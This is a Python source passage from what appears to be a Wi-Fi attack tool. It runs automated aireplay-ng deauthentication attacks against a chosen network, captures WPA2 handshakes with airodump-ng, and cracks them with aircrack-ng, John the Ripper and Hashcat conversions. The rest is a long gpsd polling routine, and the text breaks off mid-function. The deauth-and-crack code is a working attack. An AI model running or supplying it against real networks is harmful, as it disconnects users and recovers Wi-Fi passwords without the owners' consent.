    def collect_targeted(self, target_essid, target_scan_attempts, capture_attempts, packets=None, target_scan=None, initial_scan=None):
        target = target_essid
        max_scan_attempts = target_scan_attempts
        max_capture_attempts = capture_attempts
        unlimited_scan = (max_scan_attempts == 0)
        unlimited_capture = (max_capture_attempts == 0)

        if unlimited_scan:
            self.log("Unlimited scan attempts enabled. Press Ctrl+C to stop.", prefix="error")
        
        scan_attempt = 0
        try:
            while True:
                scan_attempt += 1
                if unlimited_scan:
                    self.log(f"[Scan Attempt {scan_attempt} (unlimited)] Scanning for {target}...", prefix="moved")
                else:
                    if scan_attempt > max_scan_attempts:
                        break
                    self.log(f"[Scan Attempt {scan_attempt}/{max_scan_attempts}] Scanning for {target}...", prefix="moved")

                try:
                    if not self.scan_networks(timeout=initial_scan):
                        self.log("Scan failed.", indent=8, prefix="error")
                        continue
                except KeyboardInterrupt:
                    # Re-raise to be caught by outer handler
                    raise

                if target in self.networks:
                    self.log(f"Found target ESSID '{target}' on scan attempt {scan_attempt}.", indent=4, prefix="check")
                    break
                else:
                    self.log(f"Target ESSID '{target}' not found. Retrying...", indent=4, prefix="error")
        except KeyboardInterrupt:
            self.log("Scan interrupted by user (Ctrl+C)", prefix="exited")
            raise  # Re-raise to stop the main program

        if not unlimited_scan and scan_attempt > max_scan_attempts:
            self.log(f"Target ESSID '{target}' not found after {max_scan_attempts} scan attempts.", prefix="x")
            return False

        if unlimited_capture:
            self.log("Unlimited capture attempts enabled. Will continue until EAPOL detected or Ctrl+C.", prefix="config")

        cap_attempt = 0
        try:
            while True:
                cap_attempt += 1
                if unlimited_capture:
                    self.log(f"[Capture Attempt {cap_attempt} (unlimited)]", prefix="moved")
                else:
                    if cap_attempt > max_capture_attempts:
                        break
                    self.log(f"[Capture Attempt {cap_attempt}/{max_capture_attempts}]", prefix="moved")
                
                self.capture_handshake(target, auto=True, target_scan=target_scan, packets=packets)

                if self.handshake_captured:
                    self.log(f"Handshake capture for '{target}' successful after {cap_attempt} attempts.", indent=8, prefix="check")
                    return True
                else:
                    self.log(f"No handshake detected on attempt {cap_attempt}. Retrying...", indent=4, prefix="exited")
        except KeyboardInterrupt:
            self.log("Capture interrupted by user (Ctrl+C)", prefix="exited")
            raise  # Re-raise to stop the main program

        if not unlimited_capture and cap_attempt > max_capture_attempts:
            self.log(f"Failed to capture handshake for '{target}' after {max_capture_attempts} attempts.", prefix="x")
            return False
        
        return False

    def capture_handshake(self, network, auto=False, target_scan=None, packets=None):
        """
        Attempts to capture a WPA2 handshake from the specified network 
        using airodump-ng and aireplay-ng. Checks if the capture file 
        contains an EAPOL handshake and moves it to 'collection' if 
        successful.
        """
        if network not in self.networks:
            self.log(f"Network {network} not found in scan results.", prefix="error")
            return
        self.log(f"Conducting deauth attack...", indent=4, prefix="dot")
        
        #essid = network.replace(" ", "_")
        essid = re.sub(r'[^\w\-_.]', '_', network)
        bssid = self.networks[network]['BSSID']
        channel = self.networks[network]['Channel']
        timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
        filename = f"{essid}--{bssid}--{channel}--{timestamp}"
        cap_file = f"{filename}-01.cap"

        # Explicitly set interface to target channel before starting capture/deauth
        # This ensures the interface is on the correct channel for both airodump-ng and aireplay-ng
        if self.verbose:
            self.log(f"Setting interface {self.interface} to channel {channel}...", indent=4, prefix="config")
        try:
            self.coms(['iw', 'dev', self.interface, 'set', 'channel', channel], 
                     capture_output=True, check=True, suppress_stderr=True)
            if self.verbose:
                self.log(f"Interface set to channel {channel}", indent=8, prefix="check")
        except subprocess.CalledProcessError as e:
            if self.verbose:
                self.log(f"Warning: Failed to set channel via 'iw', airodump-ng will attempt to set it", 
                        indent=8, prefix="error")
                self.log(f"Error details: {e}", indent=12, prefix="dash")

        # Run a monitor thread on the target network
        airodump_cmd = ["airodump-ng", "-w", filename, "-c", channel, "--bssid", bssid, self.interface]
        # Send deauth packets targeting that specific network

        deauth_cmd = ["aireplay-ng", "-0", str(packets if packets is not None else self.packets), "-a", bssid, self.interface]

        airodump_proc = self.coms(
            airodump_cmd,
            background=True,
            preexec_fn=os.setpgrp
        )

        # Give airodump-ng a few seconds to initialize and ensure channel is set
        time.sleep(3)

        deauth_proc = self.coms(
            deauth_cmd,
            background=True,
            preexec_fn=os.setpgrp
        )

        # Let both run for the specified target scan time
        scan_time = target_scan if target_scan is not None else 60
        try:
            time.sleep(scan_time)
        except KeyboardInterrupt:
            # If interrupted, clean up processes and re-raise
            self.log("Capture interrupted. Cleaning up processes...", prefix="exited")
            for proc in (deauth_proc, airodump_proc):
                try:
                    proc.send_signal(signal.SIGTERM)
                    proc.wait(timeout=2)
                except (subprocess.TimeoutExpired, ProcessLookupError):
                    try:
                        proc.kill()
                        proc.wait(timeout=1)
                    except:
                        pass
            raise  # Re-raise KeyboardInterrupt to stop the main program

        # Terminate processes gracefully
        for proc in (deauth_proc, airodump_proc):
            try:
                proc.send_signal(signal.SIGINT)  # Send Ctrl-C
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait()

        if os.path.exists(cap_file):
            self.log(f"Capture file {cap_file} found.", indent=4, prefix="check")
            eapol_check = self.has_eapol(cap_file)
            if eapol_check:
                self.handshake_captured = True
                self.log("EAPOL handshake detected.", prefix="check", indent=4)
                if not os.path.exists("collection"):
                    self.log("ERROR: 'collection' directory not found.", prefix="x", indent=4)
                    self.log("Please run './start.sh' to create required directories.", indent=8, prefix="error")
                    sys.exit(1)
                os.rename(cap_file, os.path.join("collection", os.path.basename(cap_file)))
                self.log("Capture moved to /collection", prefix="moved", indent=4)
            else:
                self.handshake_captured = False
                self.log("No EAPOL handshake found. Cleaning up.", prefix="x", indent=4)
        else:
            self.log("No capture file created.", prefix="error", indent=4)
        
        self.clean()
    
    def clean(self):
        self.coms("rm -rf *.csv")
        self.coms("rm -rf *.cap")
        self.coms("rm -rf *.netxml")

    def has_eapol(self, cap_file):
        """
        Uses wpapcap2john to check if the .cap file contains a valid 
        EAPOL handshake by searching for the $WPAPSK$ pattern.
        """
        try:
            result = self.coms(["wpapcap2john", cap_file], capture_output=True)
            return "$WPAPSK$" in result.stdout
        except Exception as e:
            self.log(f"Error in has_eapol: {e}", prefix="error")
            return False

    def process_all(self, mode, word_list=None):
        """
        Processes all captured .cap files. Depending on the selected 
        mode (manual or auto), runs cracking and conversion tools like 
        aircrack-ng, wpapcap2john, and hcxpcapngtool. Archives files 
        after processing.

        - Auto mode: batch processes all .cap files.
        - Manual mode: prompts user to select and process files 
          individually.
        """
        def run_aircrack(cap_path, in_file, target):
            """
            Runs aircrack-ng on the .cap file using a wordlist to 
            attempt password cracking. Logs output to a result file.
            """
            self.log(f"Running {word_list} aircrack-ng on {cap_path}...",prefix="plus",indent=4)
            result = self.coms([
                "aircrack-ng", "-w", word_list,
                "-b", self.networks[target]["BSSID"], cap_path
            ], capture_output=True, screenshot=True)

            self.log(f"Wordlist check complete.",prefix="check",indent=8)

        def run_jtr(cap_path, in_file):
            """
            Converts the .cap file to .john format using wpapcap2john. 
            Splits output into EAPOL and PMKID files for John the Ripper.
            """
            john_dir = "john"
            if not os.path.exists(john_dir):
                self.log(f"ERROR: '{john_dir}' directory not found.", prefix="x", indent=4)
                self.log("Please run './start.sh' to create required directories.", indent=8, prefix="error")
                return False
            input_path = f"{john_dir}/{in_file}.john"
            self.log(f"Running JTR .john conversion...",prefix="plus",indent=4)
            with open(input_path, "w") as outfile:
                self.coms(["wpapcap2john", cap_path], 
                    redirect_output=outfile, 
                    check=True, 
                    suppress_stderr=True
                    )
            with open(input_path, "r") as file:
                lines = file.readlines()

            eapol_lines = [l for l in lines if "$WPAPSK$" in l]
            pmkid_lines = [l for l in lines if "$WPAPSK-PMK$" in l]

            if eapol_lines:
                with open(f"{john_dir}/{in_file}_eapol.john", "w") as f:
                    f.writelines(eapol_lines)
            if pmkid_lines:
                with open(f"{john_dir}/{in_file}_pmkid.john", "w") as f:
                    f.writelines(pmkid_lines)
            
            self.log(f"JTR .john conversion complete.",prefix="check",indent=8)

        def run_hcx(cap_path, in_file):
            """
            Converts the .cap file into Hashcat-compatible .22000 format 
            using hcxpcapngtool.
            """
            hc_dir = "hc"
            if not os.path.exists(hc_dir):
                self.log(f"ERROR: '{hc_dir}' directory not found.", prefix="x", indent=4)
                self.log("Please run './start.sh' to create required directories.", indent=8, prefix="error")
                return False
            out_path = f"{hc_dir}/{in_file}.22000"
            self.log(f"Running HCX .22000 conversion...",prefix="plus",indent=4)
            self.coms(f"hcxpcapngtool -o {out_path} {cap_path}")
            self.log(f"HCX .22000 conversion complete.",prefix="check",indent=8)

        def archive(cap_path):
            """
            Moves processed .cap files into the archive/pcap directory 
            for storage.
            """
            if not os.path.exists("archive/pcap"):
                self.log(f"ERROR: 'archive/pcap' directory not found.", prefix="x", indent=4)
                self.log("Please run './start.sh' to create required directories.", indent=8, prefix="error")
                return False
            shutil.move(cap_path, f"archive/pcap/{os.path.basename(cap_path)}")

        cap_files = glob.glob("collection/*.cap")
        if not cap_files:
            self.log("No .cap files found in /collection", prefix="error")
            return

        if mode == "auto":
            for cap_path in cap_files:
                in_file = os.path.splitext(os.path.basename(cap_path))[0]
                try:
                    info = self.parse_capture_filename(in_file.replace("-01", "") + ".cap")
                    essid = info["ESSID"]
                    self.networks[essid] = {
                        "BSSID": info["BSSID"],
                        "Channel": info["Channel"],
                        "Power": "N/A",
                        "Privacy": "N/A",
                        "Authentication": "N/A",
                        "Cipher": "N/A"
                    }
                    target = essid
                except Exception as e:
                    self.log(f"Failed to parse {cap_path}: {e}", prefix="error")
                    continue

                self.log(f"Processing {cap_path}",prefix="moved")
                run_jtr(cap_path, in_file)
                run_hcx(cap_path, in_file)
                run_aircrack(cap_path, in_file, target)             

        elif mode == "manual":
            while True:
                cap_files = glob.glob("collection/*.cap")
                if not cap_files:
                    self.log("No .cap files found in /collection", prefix="error")
                    break

                self.log("Available .cap files:",prefix="blank")
                for idx, f in enumerate(cap_files, 1):
                    self.log(f"{idx}. {f}", indent=4, prefix="dot")

                choice = input("Enter the full path of the file to process (or 'q' to quit): ").strip()
                if choice.lower() == "q":
                    break
                if not os.path.isfile(choice):
                    self.log("Filename invalid. Try again.", prefix="error")
                    continue

                in_file = os.path.splitext(os.path.basename(choice))[0]
                try:
                    info = self.parse_capture_filename(in_file.replace("-01", "") + ".cap")
                    essid = info["ESSID"]
                    self.networks[essid] = {
                        "BSSID": info["BSSID"],
                        "Channel": info["Channel"],
                        "Power": "N/A",
                        "Privacy": "N/A",
                        "Authentication": "N/A",
                        "Cipher": "N/A"
                    }
                    target = essid
                except Exception as e:
                    self.log(f"Failed to parse {choice}: {e}", prefix="error")
                    continue

                self.log("Select processing option:", prefix="moved")
                self.log("1. Aircrack-ng with wordlist (WPA2 only)", indent=4, prefix="dot")
                self.log("2. JTR (.john)", indent=4, prefix="dot")
                self.log("3. Hashcat (.22000)", indent=4, prefix="dot")
                self.log("4. All of the above", indent=4, prefix="dot")
                method = input("Enter option number: ").strip()
                self.log(f"Processing {choice}", prefix="moved")
                if method == "1":
                    run_aircrack(choice, in_file, target)
                elif method == "2":
                    run_jtr(choice, in_file)
                elif method == "3":
                    run_hcx(choice, in_file)
                elif method == "4":
                    run_jtr(choice, in_file)
                    run_hcx(choice, in_file)
                    run_aircrack(choice, in_file, target)
                else:
                    self.log("Invalid option.", prefix="error")
                    continue

                archive(choice)
        else:
            self.log("Invalid process mode.", prefix="error")

        self.log(f"Processing complete.",prefix="exited")

    # NOTE (overwatch branch): direct-serial GPS init removed. GPS is provided
    # exclusively via gpsd over the network (10.0.0.2:2947) — see start_gps_polling().

    def check_gpsd_running(self, gps_host=None, gps_port=None):
        """
        Check if gpsd is running and accessible.
        Defaults to the configured network gpsd target (self.gps_network_host/port,
        loaded from config/config.ini [GPS] — see load_gps_config()) if not overridden.
        """
        if gps_host is None:
            gps_host = getattr(self, "gps_network_host", "10.0.0.2")
        if gps_port is None:
            gps_port = getattr(self, "gps_network_port", 2947)
        try:
            import socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((gps_host, gps_port))
            sock.close()
            return result == 0
        except Exception:
            return False

    def start_gps_polling(self, gps_host=None, gps_port=None, poll_interval=0.5, gps_device=None):
        """
        Starts a background thread that polls gpsd for the latest GPS fix every poll_interval seconds using gps3.
        Continuously updates the latest GPS position as new data arrives.
        
        Args:
            gps_host/gps_port: network gpsd target. Defaults to the configured
                self.gps_network_host/port (config/config.ini [GPS]) if not overridden.
            gps_device: USB device path (e.g., /dev/ttyUSB0) - used for gpsd setup instructions if not running
        """
        if gps_host is None:
            gps_host = getattr(self, "gps_network_host", "10.0.0.2")
        if gps_port is None:
            gps_port = getattr(self, "gps_network_port", 2947)
        self.log("GPS", prefix="config")
        
        # Check for USB GPS devices first
        if gps_device:
            if not os.path.exists(gps_device):
                self.log(f"GPS device {gps_device} not found.", prefix="error", indent=4)
                with self.gps_lock:
                    self.gps_status = 'no_device'
                if hasattr(self, 'gps_status_callback'):
                    self.gps_status_callback('no_device')
                return False
        
        # Check if gpsd is running
        if not self.check_gpsd_running(gps_host, gps_port):
            self.log("gpsd is not running or not accessible.", prefix="error", indent=4)
            if gps_device:
                self.log(f"To start gpsd with your GPS device, run:", prefix="error", indent=4)
                self.log(f"  sudo gpsd {gps_device} -F /var/run/gpsd.sock", indent=8, prefix="blank")
                self.log(f"Or install and start gpsd service:", indent=8, prefix="blank")
                self.log(f"  sudo apt install gpsd gpsd-clients", indent=8, prefix="blank")
                self.log(f"  sudo systemctl start gpsd", indent=8, prefix="blank")
                self.log(f"  sudo systemctl enable gpsd", indent=8, prefix="blank")
            else:
                self.log("Please ensure gpsd is running on port 2947", prefix="error", indent=4)
            with self.gps_lock:
                self.gps_status = 'no_data'
            if hasattr(self, 'gps_status_callback'):
                self.gps_status_callback('no_data')
            return False
        
        # Check if GPS thread is already running
        if self.gps_thread and self.gps_thread.is_alive():
            self.log("GPS polling already active, reusing existing connection", indent=4, prefix="check")
            return True
        
        self.gps_thread_stop.clear()
        # Initialize GPS status to 'searching' when starting (not 'locked')
        # This ensures status is correct even if no data is received yet
        with self.gps_lock:
            if self.gps_status == 'disabled':
                self.gps_status = 'searching'
                if hasattr(self, 'gps_status_callback'):
                    self.gps_status_callback('searching')
        def poll():
            if self.verbose:
                self.log(f"GPS polling thread started for device: {gps_device}", indent=4, prefix="dot")
            gps_socket = None
            data_stream = None
            try:
                gps_socket = gps3.GPSDSocket()
                data_stream = gps3.DataStream()
                gps_socket.connect(host=gps_host, port=gps_port)
                gps_socket.watch()
                self.log("Connected to gpsd successfully.", indent=4, prefix="check")
                if self.verbose:
                    self.log(f"Connected to gpsd at {gps_host}:{gps_port}, watching for data...", indent=4, prefix="dot")
                # Give gpsd a moment to start sending data
                time.sleep(0.5)
                
                # Set socket timeout for non-blocking operation
                if hasattr(gps_socket, 'socket') and gps_socket.socket:
                    gps_socket.socket.settimeout(2.0)
                
                # Check if gpsd has devices configured by trying to get DEVICES data
                # If gpsd has no devices, it won't send TPV data and we should detect this
                if self.verbose:
                    self.log(f"Starting GPS data polling loop for device: {gps_device}", indent=4, prefix="dot")
                devices_check_count = 0
                max_devices_check = 60  # Check for 30 seconds (60 * 0.5s) before first warning
                
                # Continuously read GPS data as it arrives
                no_data_count = 0
                max_no_data = 20
                last_status_update = time.time()
                last_no_data_warning = 0
                no_data_timeout = 30  # After 30 seconds of no data, assume gpsd has no devices
                start_time = time.time()
                last_status_check = time.time()
                last_gps_data_time = time.time()  # Track when we last received GPS data
                
                while not self.gps_thread_stop.is_set():
                    try:
                        # Use next() with timeout handling
                        try:
                            new_data = next(gps_socket)
                        except (StopIteration, socket.timeout, OSError):
                            new_data = None
                        except Exception as e:
                            if 'timeout' in str(e).lower() or 'timed out' in str(e).lower():
                                new_data = None
                            else:
                                raise
                        
                        if not new_data:
                            no_data_count += 1
                            elapsed_time = time.time() - start_time
                            time_since_last_data = time.time() - last_gps_data_time
                            
                            # Only show warning if gpsd has stopped sending data entirely (not just invalid coordinates)
                            # Check if we've actually received ANY data from gpsd since starting
                            never_received_data = (last_gps_data_time == start_time)  # Never updated from initial value
                            very_long_time_since_data = time_since_last_data > 300  # 5 minutes
                            
                            # Also check if GPS has valid coordinates recently (indicates GPS is working, just brief timeout)
                            gps_has_recent_valid_data = False
                            with self.gps_lock:
                                if (self.gps_position_last_updated and 
                                    (time.time() - self.gps_position_last_updated) < 60):  # Had valid coordinates in last minute
                                    gps_has_recent_valid_data = True
                            
                            # Only warn if:
                            # 1. We've never received ANY data from gpsd (indicates gpsd configuration issue)
                            # 2. OR it's been 5+ minutes since gpsd last sent ANY data (indicates gpsd stopped working)
                            # 3. AND GPS hasn't had valid coordinates recently (if GPS was working, don't warn on brief timeouts)
                            # 4. AND at least 5 minutes since last warning (to avoid spam)
                            if (time.time() - last_no_data_warning > 300 and  # 5 minutes between warnings
                                (never_received_data or very_long_time_since_data) and
                                not gps_has_recent_valid_data):  # Don't warn if GPS was working recently
                                # Only warn if gpsd itself has stopped sending data, not just temporary coordinate loss
                                if gps_device:
                                    if never_received_data:
                                        self.log(f"gpsd is running but has never sent any data from {gps_device}.", prefix="warning", indent=4)
                                    else:
                                        self.log(f"gpsd is running but has not sent any data for {int(time_since_last_data)} seconds.", prefix="warning", indent=4)
                                    self.log(f"Make sure gpsd is configured with your device:", prefix="warning", indent=4)
                                    self.log(f"  sudo gpsd {gps_device} -F /var/run/gpsd.sock", indent=8, prefix="blank")
                                    self.log(f"Or restart gpsd service with device:", indent=8, prefix="blank")
                                    self.log(f"  sudo systemctl stop gpsd", indent=8, prefix="blank")
                                    self.log(f"  sudo gpsd {gps_device} -F /var/run/gpsd.sock", indent=8, prefix="blank")
                                last_no_data_warning = time.time()
                            
                            # After extended period with no data, only log error if we've NEVER received data from gpsd
                            # If GPS was working and then stops, it's likely temporary signal loss, not a gpsd issue
                            never_received_data = (last_gps_data_time == start_time)
                            very_long_time_since_data = time_since_last_data > 300  # 5 minutes
                            
                            # Also check if GPS has valid coordinates recently (indicates GPS is working, just brief timeout)
                            gps_has_recent_valid_data = False
                            with self.gps_lock:
                                if (self.gps_position_last_updated and 
                                    (time.time() - self.gps_position_last_updated) < 60):  # Had valid coordinates in last minute
                                    gps_has_recent_valid_data = True
                            
                            # Only log error if we've never received ANY data from gpsd (indicates gpsd configuration issue)
                            # OR if it's been 5+ minutes since gpsd last sent ANY data (indicates gpsd stopped working)
                            # AND GPS hasn't had valid coordinates recently (if GPS was working, don't error on brief timeouts)
                            if (elapsed_time >= no_data_timeout and no_data_count >= max_no_data and 
                                (never_received_data or very_long_time_since_data) and
                                not gps_has_recent_valid_data):  # Don't error if GPS was working recently
                                # Check if we've already logged this error for this timeout period
                                if not hasattr(self, '_last_no_data_error_log') or (time.time() - self._last_no_data_error_log) > 300:
                                    if never_received_data:
                                        self.log(f"gpsd is running but has never sent any GPS data.", prefix="error", indent=4)
                                    else:
                                        self.log(f"gpsd is running but has not sent any GPS data for {int(time_since_last_data)} seconds.", prefix="error", indent=4)
                                    self.log(f"This usually means gpsd is not configured with a GPS device.", prefix="error", indent=4)
                                    if gps_device:
                                        self.log(f"To fix this, run:", prefix="error", indent=4)
                                        self.log(f"  sudo systemctl stop gpsd", indent=8, prefix="blank")
                                        self.log(f"  sudo gpsd {gps_device} -F /var/run/gpsd.sock", indent=8, prefix="blank")
                                    self._last_no_data_error_log = time.time()
                                with self.gps_lock:
                                    # Update to 'searching' (orange) - GPS is active but no data received
                                    if self.gps_status not in ('disabled', 'no_device') and self.gps_status != 'searching':
                                        self.gps_status = 'searching'
                                        if hasattr(self, 'gps_status_callback'):
                                            self.gps_status_callback('searching')
                                # Continue polling in case device is added later
                            
                            # Status will be updated by the periodic check above
                            time.sleep(0.5)
                            continue
                        
                        no_data_count = 0  # Reset on successful read
                        # Update last_gps_data_time whenever we receive ANY data from gpsd
                        # This distinguishes between "gpsd not sending data" vs "gpsd sending data but no valid coordinates"
                        if new_data:
                            # We received data from gpsd (even if not valid coordinates), so gpsd is working
                            last_gps_data_time = time.time()
                        
                        try:
                            data_stream.unpack(new_data)
                            # Check if we have TPV data - TPV is a dict-like object in gps3
                            # In gps3, TPV is accessed as data_stream.TPV and it's a dict
                            if not hasattr(data_stream, 'TPV') or not data_stream.TPV:
                                # Log when we receive data but no TPV (every 10 seconds to avoid spam)
                                if not hasattr(self, '_last_no_tpv_log') or (time.time() - self._last_no_tpv_log) > 10:
                                    self.log(f"[GPS DEBUG] Received data from gpsd but no TPV data available yet (data length: {len(new_data) if new_data else 0})", indent=8, prefix="dot")
                                    self._last_no_tpv_log = time.time()
                            if hasattr(data_stream, 'TPV') and data_stream.TPV:
                                tpv = data_stream.TPV
                                if tpv:  # TPV exists and is not empty
                                    # TPV in gps3 is a dict, use .get() method
                                    try:
                                        mode = tpv.get('mode', 0)
                                        lat = tpv.get('lat')
                                        lon = tpv.get('lon')
                                        alt = tpv.get('alt')
                                        ts = tpv.get('time')
                                        
                                        # Ensure mode is an integer for comparison
                                        try:
                                            mode = int(mode) if mode is not None else 0
                                        except (ValueError, TypeError):
                                            mode = 0
                                        
                                        # Only log GPS TPV data in verbose mode
                                        if self.verbose and (not hasattr(self, '_last_gps_debug_time') or (time.time() - self._last_gps_debug_time) > 10):
                                            self.log(f"GPS TPV data: mode={mode}, lat={lat}, lon={lon}, alt={alt}", indent=8, prefix="dot")
                                            self._last_gps_debug_time = time.time()
                                        
                                        # Update position if we have valid coordinates (mode >= 2) and valid lat/lon
                                        # Check for None, empty string, or "n/a" string
                                        lat_valid = lat is not None and lat != "" and str(lat).lower() not in ('n/a', 'nan', 'none')
                                        lon_valid = lon is not None and lon != "" and str(lon).lower() not in ('n/a', 'nan', 'none')
                                        
                                        # Only log mode >= 2 debug in verbose mode
                                        if self.verbose and mode is not None and mode >= 2:
                                            if not hasattr(self, '_last_mode2_debug') or (time.time() - self._last_mode2_debug) > 10:
                                                self.log(f"GPS mode={mode} >= 2, lat_valid={lat_valid}, lon_valid={lon_valid}", indent=8, prefix="dot")
                                                self._last_mode2_debug = time.time()
                                        
                                        if mode is not None and mode >= 2 and lat_valid and lon_valid:
                                            try:
                                                # Validate lat/lon are valid numbers
                                                lat_float = float(lat)
                                                lon_float = float(lon)
                                                
                                                # Check for NaN (NaN != NaN is True)
                                                is_nan = (lat_float != lat_float) or (lon_float != lon_float)
                                                
                                                # Check if coordinates are valid (not both 0,0 and not NaN)
                                                # Allow coordinates even if one is near 0 (e.g., on equator or prime meridian)
                                                both_zero = (abs(lat_float) < 0.0001 and abs(lon_float) < 0.0001)
                                                
                                                # Only log lock attempt in verbose mode
                                                if self.verbose and (not hasattr(self, '_last_lock_attempt_log') or (time.time() - self._last_lock_attempt_log) > 10):
                                                    self.log(f"GPS attempting lock: lat={lat_float:.6f}, lon={lon_float:.6f}", indent=8, prefix="dot")
                                                    self._last_lock_attempt_log = time.time()
                                                
                                                if not is_nan and not both_zero:
                                                    pos = {
                                                        'latitude': lat_float,
                                                        'longitude': lon_float,
                                                        'altitude': float(alt) if alt is not None and str(alt).lower() not in ('n/a', 'nan', 'none') else None,
                                                        'timestamp': ts
                                                    }
                                                    with self.gps_lock:
                                                        old_status = self.gps_status
                                                        self.latest_gps_position = pos
                                                        self.gps_position_last_updated = time.time()
                                                        # Status is 'locked' (green) when we have valid coordinates
                                                        self.gps_status = 'locked'
                                                    
                                                    # last_gps_data_time is already updated above when we receive ANY data from gpsd
                                                    # No need to update again here - we want to track when gpsd sends data, not just valid coordinates
                                                    
                                                    # Only log GPS data reception if status changed or in verbose mode
                                                    with self.gps_lock:
                                                        status_changed = (old_status != 'locked')
                                                    if status_changed and self.verbose:
                                                        self.log(f"GPS receiving valid coordinates: lat={lat_float:.6f}, lon={lon_float:.6f}, alt={alt}", indent=8, prefix="success")
                                                    
                                                    # Always update status callback when we receive valid data
                                                    if hasattr(self, 'gps_status_callback'):
                                                        self.gps_status_callback('locked')
                                                else:
                                                    # Coordinates are 0,0 or NaN - log this
                                                    self.log(f"GPS coordinates invalid - mode={mode}, lat={lat_float}, lon={lon_float}, is_nan={is_nan}, both_zero={both_zero}", indent=8, prefix="warning")
                                            except (ValueError, TypeError) as e:
                                                # Invalid coordinates - skip this update
                                                self.log(f"Invalid GPS coordinates: lat={lat} (type={type(lat).__name__}), lon={lon} (type={type(lon).__name__}), error={e}", prefix="warning", indent=4)
                                                import traceback
                                                self.log(f"Traceback: {traceback.format_exc()}", prefix="error", indent=4)
                                                pass
                                            except Exception as e:
                                                # Catch any other exception
                                                self.log(f"Unexpected error in GPS lock detection: {e}", prefix="error", indent=4)
                                                import traceback
                                                self.log(f"Traceback: {traceback.format_exc()}", prefix="error", indent=4)
                                                pass
                                        elif mode is not None and mode >= 2:
                                            # Mode >= 2 but lat/lon are invalid - log this
                                            if not hasattr(self, '_last_mode2_invalid_log') or (time.time() - self._last_mode2_invalid_log) > 10:
                                                self.log(f"GPS mode={mode} (2D/3D fix) but invalid coordinates: lat={lat} (type={type(lat).__name__}), lon={lon} (type={type(lon).__name__})", indent=8, prefix="warning")
                                                self._last_mode2_invalid_log = time.time()
                                        elif mode is not None and mode >= 1:
                                            # GPS has data but no fix yet - log this
                                            if not hasattr(self, '_last_mode1_log') or (time.time() - self._last_mode1_log) > 10:
                                                self.log(f"GPS mode=1 (no fix yet): lat={lat}, lon={lon}, waiting for 2D/3D fix", indent=8, prefix="dot")
                                                self._last_mode1_log = time.time()
                                        else:
                                            # Mode is 0 or None - log this
                                            if not hasattr(self, '_last_mode0_log') or (time.time() - self._last_mode0_log) > 10:
                                                self.log(f"GPS mode=0 (no data): mode={mode}, lat={lat}, lon={lon}", indent=8, prefix="dot")
                                                self._last_mode0_log = time.time()
                                    except (AttributeError, TypeError, ValueError) as e:
                                        # TPV might not have .get() method, try direct access
                                        try:
                                            mode = getattr(tpv, 'mode', 0)
                                            lat = getattr(tpv, 'lat', None)
                                            lon = getattr(tpv, 'lon', None)
                                            alt = getattr(tpv, 'alt', None)
                                            ts = getattr(tpv, 'time', None)
                                            
                                            # Ensure mode is an integer for comparison
                                            try:
                                                mode = int(mode) if mode is not None else 0
                                            except (ValueError, TypeError):
                                                mode = 0
                                            
                                            # Only log GPS TPV data in verbose mode (fallback path)
                                            if self.verbose and (not hasattr(self, '_last_gps_debug_time_fallback') or (time.time() - self._last_gps_debug_time_fallback) > 10):
                                                self.log(f"GPS TPV data (fallback): mode={mode}, lat={lat}, lon={lon}, alt={alt}", indent=8, prefix="dot")
                                                self._last_gps_debug_time_fallback = time.time()
                                            
                                            # Check for None, empty string, or "n/a" string
                                            lat_valid = lat is not None and lat != "" and str(lat).lower() not in ('n/a', 'nan', 'none')
                                            lon_valid = lon is not None and lon != "" and str(lon).lower() not in ('n/a', 'nan', 'none')
                                            
                                            if mode is not None and mode >= 2 and lat_valid and lon_valid:
                                                try:
                                                    # Validate lat/lon are valid numbers
                                                    lat_float = float(lat)
                                                    lon_float = float(lon)
                                                    # Check if coordinates are valid (not 0,0 which might be invalid, and not NaN)
                                                    if not (abs(lat_float) < 0.0001 and abs(lon_float) < 0.0001) and not (lat_float != lat_float or lon_float != lon_float):
                                                        pos = {
                                                            'latitude': lat_float,
                                                            'longitude': lon_float,
                                                            'altitude': float(alt) if alt is not None and str(alt).lower() not in ('n/a', 'nan', 'none') else None,
                                                            'timestamp': ts
                                                        }
                                                        with self.gps_lock:
                                                            old_status = self.gps_status
                                                            self.latest_gps_position = pos
                                                            self.gps_position_last_updated = time.time()
                                                            self.gps_status = 'locked'
                                                        
                                                        # Always log GPS lock achievement (fallback path)
                                                        self.log(f"GPS LOCK ACHIEVED (fallback): mode={mode}, lat={lat_float:.6f}, lon={lon_float:.6f}, alt={alt}", indent=8, prefix="success")
                                                        
                                                        # Update status callback if available (always update to ensure recovery)
                                                        if hasattr(self, 'gps_status_callback'):
                                                            self.gps_status_callback('locked')
                                                    else:
                                                        # Coordinates are 0,0 or NaN - log this
                                                        self.log(f"GPS coordinates invalid (0,0 or NaN, fallback) - mode={mode}, lat={lat_float}, lon={lon_float}", indent=8, prefix="warning")
                                                except (ValueError, TypeError) as e:
                                                    # Invalid coordinates - skip this update
                                                    self.log(f"Invalid GPS coordinates (fallback): lat={lat} (type={type(lat).__name__}), lon={lon} (type={type(lon).__name__}), error={e}", prefix="warning", indent=4)
                                                    pass
                                            elif mode is not None and mode >= 2:
                                                # Mode >= 2 but lat/lon are invalid - log this
                                                if not hasattr(self, '_last_mode2_invalid_log_fallback') or (time.time() - self._last_mode2_invalid_log_fallback) > 10:
                                                    self.log(f"GPS mode={mode} (2D/3D fix, fallback) but invalid coordinates: lat={lat} (type={type(lat).__name__}), lon={lon} (type={type(lon).__name__})", indent=8, prefix="warning")
                                                    self._last_mode2_invalid_log_fallback = time.time()
                                            elif mode is not None and mode >= 1:
                                                # GPS has data but no fix yet - log this
                                                if not hasattr(self, '_last_mode1_log_fallback') or (time.time() - self._last_mode1_log_fallback) > 10:
                                                    self.log(f"GPS mode=1 (no fix yet, fallback): lat={lat}, lon={lon}, waiting for 2D/3D fix", indent=8, prefix="dot")
                                                    self._last_mode1_log_fallback = time.time()
                                                # Update status to 'searching' if needed
                                                # BUT: Never overwrite 'locked' status - if we were locked recently, keep it locked
                                                with self.gps_lock:
                                                    # Only update if we're not already locked (to avoid overwriting lock)
                                                    # Also check if we've been locked recently (within last 5 seconds)
                                                    current_time = time.time()
                                                    recently_locked = (
                                                        hasattr(self, 'gps_position_last_updated') and 
                                                        self.gps_position_last_updated and 
                                                        (current_time - self.gps_position_last_updated) < 5.0
                                                    )
                                                    
